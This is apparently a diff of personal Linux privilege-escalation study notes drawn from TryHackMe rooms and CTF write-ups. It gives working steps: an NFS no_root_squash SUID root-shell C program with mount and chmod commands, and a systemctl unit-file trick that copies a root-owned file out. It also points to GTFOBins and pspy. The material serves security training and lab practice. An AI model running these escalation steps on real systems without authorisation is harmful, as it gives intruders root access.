-[From: https://tryhackme.com/room/linprivesc ; Task 11 - Privilege Escalation: NFS (with editing, etc.) and https://medium.com/@cyberjunkiebynight/linux-privesc-tryhackme-write-up-a284b97d5f4 (with editing, etc.)]
+[From: https://tryhackme.com/room/linprivesc ; Task 11 - Privilege Escalation: NFS (with editing, etc.) and https://medium.com/@cyberjunkiebynight/linux-privesc-tryhackme-write-up-a284b97d5f4 (with editing, etc.)]  
 Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.
 
 Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.
 
-NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.
+NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.  
 The critical element for this privilege escalation vector is the “no_root_squash” option that may appear next to certain shares. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges (i.e. squash the root). However, if the “no_root_squash” option is present on a writable share, we CAN create an executable with the SUID bit set and run it on the target system.
 
-To elevate privileges, we start by enumerating mountable shares from our attacking machine:
-> showmount -e <TARGET_IP>
-We check which shares have “no_root_squash”:
-> cat /etc/exports
-If we find a share that is both writable and is “no_root_squash”, we mount it to our attacking machine and start building our executable, as follows:
+To elevate privileges, we start by enumerating mountable shares from our attacking machine:  
+> showmount -e <TARGET_IP>  
+We check which shares have “no_root_squash”:  
+> cat /etc/exports  
+If we find a share that is both writable and is “no_root_squash”, we mount it to our attacking machine and start building our executable, as follows:  
 [Note: in the following example we are assuming that /tmp is both writable and has “no_root_squash” set.]
 
-> mkdir /tmp/<FOLDERNAME_WHERE_WE_WILL_PUT_OUR_EXECUTABLE>
-> mount -o rw <TARGET_IP>:/tmp /tmp/<FOLDERNAME_WHERE_WE_WILL_PUT_OUR_EXECUTABLE>
-As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.
-Now create a executable file that will run “/bin/bash” on the target system upon execution:
-> nano <FILENAME>.c
-int main()
-{ setgid(0);
- setuid(0);
- system("/bin/bash");
- return 0;
-}
-Now compile the executable:
-> gcc <FILENAME>.c -o <OUTPUT_FILENAME> -w
-Set SUID bit:
-> chmod +s <OUTPUT_FILENAME>
-The 'ls -la' command in the target_IP's ssh terminal should show the executable now present on the target_IP.
-Run the executable from the target_IP:
-> ./<OUTPUT_FILENAME>
-Check if you have root:
-> id
-or
+> mkdir /tmp/<FOLDERNAME_WHERE_WE_WILL_PUT_OUR_EXECUTABLE>  
+> mount -o rw <TARGET_IP>:/tmp /tmp/<FOLDERNAME_WHERE_WE_WILL_PUT_OUR_EXECUTABLE>  
+As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.  
+Now create a executable file that will run “/bin/bash” on the target system upon execution:  
+> nano <FILENAME>.c  
+int main()  
+{ setgid(0);  
+ setuid(0);  
+ system("/bin/bash");  
+ return 0;  
+}  
+Now compile the executable:  
+> gcc <FILENAME>.c -o <OUTPUT_FILENAME> -w  
+Set SUID bit:  
+> chmod +s <OUTPUT_FILENAME>  
+The 'ls -la' command in the target_IP's ssh terminal should show the executable now present on the target_IP.  
+Run the executable from the target_IP:  
+> ./<OUTPUT_FILENAME>  
+Check if you have root:  
+> id  
+or  
 > whoami
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
-[From: https://tryhackme.com/room/vulnversity ; Task 5 - Privilege Escalation]
-"In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).
+[From: https://tryhackme.com/room/vulnversity ; Task 5 - Privilege Escalation]  
+"In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).  
 For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes."
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Another recommended TryHackMe room on this topic is: https://tryhackme.com/room/kenobi ; Task 4 - Privilege Escalation with Path Variable Manipulation.
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
-From: https://unicornsec.com/home/tryhackme-vulnversity
-"Privilege Escalation
+From: https://unicornsec.com/home/tryhackme-vulnversity  
+"Privilege Escalation  
 [After] we have a remote shell on our target the next step is to try to escalate our privileges to root. A common technique for privesc when doing CTFs or online challenges like this is to look for files that have the SUID bit set. 
 
 So how do we find SUID files on our target?
@@ -494,17 +494,17 @@ Our target system allows any logged in user to create a system service and run i
 
 [In the below example systemctl is exploited to pipe data from a file in the root directory to a file accessible to a standard user (a type of privilege escalation).
 
-The commands to escalate privileges using systemctl is as follows:
-$ eop=$(mktemp).service
-$ echo ‘[Service]
-> ExecStart=/bin/sh -c “cat /root/root.txt > /tmp/output”
-> [Install]
-> WantedBy=multi-user.target’ > $eop
-$ /bin/systemctl link $eop
-$ /bin/systemctl enable --now $eop
+The commands to escalate privileges using systemctl is as follows:  
+$ eop=$(mktemp).service  
+$ echo ‘[Service]  
+> ExecStart=/bin/sh -c “cat /root/root.txt > /tmp/output”  
+> [Install]  
+> WantedBy=multi-user.target’ > $eop  
+$ /bin/systemctl link $eop  
+$ /bin/systemctl enable --now $eop  
 Here is the explanation of each command:]
 
-eop=$(mktemp).service - we are creating an environment variable called “eop” (you can call it whatever you want). Within that variable we are calling the mktemp command to create a temporary file as a systemd service unit file (the “.service” part at the end)
+eop=$(mktemp).service - we are creating an environment variable called “eop” (you can call it whatever you want). Within that variable we are calling the mktemp command to create a temporary file as a systemd service unit file (the “.service” part at the end)  
 ...The problem [was] that our current logged-in user does not have permission to write to /etc/systemd/system where this would normally go. We get around that by echoing our unit file one line at a time into the env variable we just created.
 
 echo ‘[Service] - calls the echo command to start echoing the input (notice the single quote? By not including the second single quote to close the line we are able to enter multiple single line inputs and complete our systemd unit file)
@@ -519,14 +519,14 @@ WantedBy=multi-user.target’ > $eop - sets the state (or runlevel) at which thi
 
 /bin/systemctl enable --now $eop - also per the systemctl man page “…Enable one or more units or unit instances. This will create a set of symlinks, as encoded in the "[Install]" sections of the indicated unit files. After the symlinks have been created, the system manager configuration is reloaded (in a way equivalent to daemon-reload), in order to ensure the changes are taken into account immediately. Note that this does not have the effect of also starting any of the units being enabled. If this is desired, combine this command with the --now switch…”
 
-From here we check the output file we created and are greeted with the [data from the targeted file residing in the root directory]."
+From here we check the output file we created and are greeted with the [data from the targeted file residing in the root directory]."  
 From: https://unicornsec.com/home/tryhackme-vulnversity
 --------------------------------------------------------------------------------------------------------------------------------------------------------
-Linux Privilege Escalation Cheat Sheet:
+Linux Privilege Escalation Cheat Sheet:  
 https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Cheat%20sheets%20reference%20pages%20Checklists%20-/Linux/cheat%20sheet%20Basic%20Linux%20Privilege%20Escalation.txt
 --------------------------------------------------------------------------------------------------------------------------------------------------------
-GTFOBins
-https://gtfobins.github.io/
+GTFOBins  
+https://gtfobins.github.io/  
 "GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.
 
 The project collects legitimate functions of Unix binaries that can be abused to ... break out [of] restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.
@@ -537,28 +537,28 @@ Post-access Discovery/Enumeration Commands
 -------------------------------------------
 [From: NetworkChuck - HELP!! (for when you suck at Linux) // Linux for Hackers // EP3 ; https://www.youtube.com/watch?v=Y17KTiJLcyQ&list=PLIhvC56v63IJIujb5cyE13oLuyORZpdkL&index=6]
 
-* id
-* hostname
-* uname 
-* uname -a
-* uname -r
-* ifconfig
-* ip
-* netstat
-* ss
-* ps
-* whoami
-* who [tells who else is logged into system]
-* env [environment variables]
-* lsblk
-* lsusb [lists any USBs plugged in to system]
+* id  
+* hostname  
+* uname  
+* uname -a  
+* uname -r  
+* ifconfig  
+* ip  
+* netstat  
+* ss  
+* ps  
+* whoami  
+* who [tells who else is logged into system]  
+* env [environment variables]  
+* lsblk  
+* lsusb [lists any USBs plugged in to system]  
 * lsof [lists all open files]
 ------------------------------------------------------------------------------------------------------------------------------------------------------------
 From Heath Adams - The Cyber Mentor (Practical Ethical Hacking: The Complete Course - https://academy.tcm-sec.com/courses/1152300)
 
-A helpful tool for discovering running processes in Linux (useful for enumeration and privilege escalation).
-https://github.com/DominicBreuker/pspy
-"pspy - unprivileged Linux process snooping
+A helpful tool for discovering running processes in Linux (useful for enumeration and privilege escalation).  
+https://github.com/DominicBreuker/pspy  
+"pspy - unprivileged Linux process snooping  
 pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea."
 
 The tool gathers the info from procfs scans. Inotify watchers placed on selected parts of the file system trigger these scans to catch short-lived processes.
